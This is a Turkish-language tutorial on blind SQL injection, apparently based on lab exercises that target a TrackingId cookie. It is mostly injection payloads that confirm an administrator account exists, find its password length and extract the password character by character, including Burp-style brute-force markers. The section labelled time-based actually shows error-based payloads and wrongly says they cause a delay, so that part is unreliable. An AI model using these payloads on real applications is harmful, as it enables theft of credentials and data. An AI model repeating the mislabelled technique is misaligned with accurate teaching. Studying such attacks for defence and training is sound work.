# Blind SQL injection

### Tanım
Blind SQL Injection (Kör SQL Enjeksiyonu), SQL enjeksiyonunun bir türüdür. Bu saldırı türünde, veritabanı çıktısı veya hata mesajı doğrudan kullanıcılara gösterilmez. Bunun yerine, saldırgan SQL sorgularının doğru ya da yanlış olduğunu anlamak için uygulamanın yanıtlarını analiz eder. Saldırgan, doğru bir yanıt almak için sorguda belirli bir mantık kullanarak adım adım bilgi toplar. Genellikle bu tür saldırılarda, "Evet/Hayır" türünde yanıtlar elde edilir ve buna göre tahminler yapılır.

Blind SQL Injection, veritabanı hatalarının gizlendiği ve çıktının sınırlı olduğu uygulamalarda kullanılır. Saldırgan, doğru yanıtları almak için çeşitli koşulları test eder ve sonuçları gözlemler. Bu, şifreleri, veritabanı şemalarını veya diğer hassas bilgileri açığa çıkarabilir.

#### Blind SQL Injection Sorgularına Genel Örnekler:

1. **Temel Sorgu Örneği**:
    ```sql
    SELECT * FROM sessions WHERE TrackingId = 'xyz123';
    ```
    - Bu sorgu, `TrackingId` değeri 'xyz123' olan kayıtları çeker.

2. **Koşul Kontrolü - True (Doğru Koşul)**:
    ```sql
    SELECT * FROM users WHERE TrackingId = 'xyz' AND '1'='1';
    ```
    - Bu sorguda `'1'='1'` her zaman doğru olduğu için sorgu başarılı olacaktır.

3. **Koşul Kontrolü - False (Yanlış Koşul)**:
    ```sql
    SELECT * FROM users WHERE TrackingId = 'xyz' AND '1'='2';
    ```
    - Bu sorguda `'1'='2'` yanlış olduğu için sorgu başarısız olur.

#### Blind SQL Injection İle Bilgi Elde Etme

Blind SQL Injection, saldırganın uygulamanın yanıtlarını kullanarak çeşitli bilgilere ulaşmasına yardımcı olabilir. Bu, özellikle şifreleri, kullanıcı bilgilerini ve veritabanı yapısını keşfetmek için kullanılır.

1. **Veritabanı Bilgisi Edinme**:
    - **Koşul**: `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'`
      - Bu sorgu, veritabanında 'administrator' kullanıcısının mevcut olup olmadığını kontrol eder.
    - **Yanlış Koşul**: `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='b'`
      - Bu durumda, `administrator` kullanıcısının olmadığını anlamak için sorgu yanıtı gözlemlenir. Yanıt başarısız olursa, bu kullanıcı veritabanında mevcut değildir.

2. **Parola Uzunluğu Kontrolü**:
    - **Koşul**: `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'`
      - Burada, `administrator` kullanıcısının şifresinin uzunluğunun 1'den fazla olup olmadığı sorgulanır. Eğer şifre uzunluğu 1'den büyükse, doğru bir yanıt alınır.

3. **Parola Karakterlerini Öğrenme**:
    - **İlk Karakter**: `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'`
      - Bu sorgu, `administrator` kullanıcısının şifresinin ilk karakterinin 'a' olup olmadığını kontrol eder.
    - **Farklı Karakter**: `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§'`
      - Burada, şifrenin ilk karakterinin `'§a§'` olup olmadığı kontrol edilir. Bu tür karakterlerle sistemin doğru cevabı nasıl verdiği gözlemlenir.

4. **Şifre Uzunluğunu Kontrol Etme**:
    - **Koşul**: `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a'`
      - Bu sorgu, şifrenin uzunluğunun 3'ten fazla olup olmadığını kontrol eder.

#### Zaman Tabanlı Blind SQL Injection

Zaman tabanlı Blind SQL Injection, belirli bir koşul doğru olduğunda sorgunun yanıt süresini değiştirmek için kullanılır. Bu, saldırganın doğru yanıtı bulmasını sağlar.

1. **Zaman Tabanlı Blind SQL Injection Örneği**:
    - **Şifre Karakteri Kontrolü**: 
    ```sql
    TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    ```
    - Bu sorgu, `administrator` kullanıcısının şifresinin ikinci karakterinin `'§a§'` olup olmadığını kontrol eder. Eğer doğruysa, `TO_CHAR(1/0)` komutu hata üretir ve sorgu zamanlanır. Bu da saldırgana doğru cevabı verdiğini gösterir.

    - **İlk Karakter Kontrolü**:
    ```sql
    TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    ```
    - Bu sorgu, şifrenin ilk karakterinin `'a'` olup olmadığını kontrol eder. Eğer doğruysa, hata oluşur ve zaman tabanlı yanıt alınır.

### Blind SQL Injection ile Şifre Kırma

Blind SQL Injection, saldırganın her bir karakteri tahmin etmesine ve şifreyi adım adım kırmasına olanak tanır. Bu tür saldırılarda genellikle şu adımlar izlenir:
1. Şifrenin uzunluğu tahmin edilir.
2. Karakter karakter, şifrenin her bir bölümü test edilir.
3. Sistemin sağladığı farklı yanıtlar (başarı, başarısızlık) kullanılarak şifre tamamlanır.

Bu saldırı türü, kullanıcıdan alınan bilgilerin doğru bir şekilde doğrulanmadığı durumlarda, veritabanı bilgilerine erişim sağlar. 
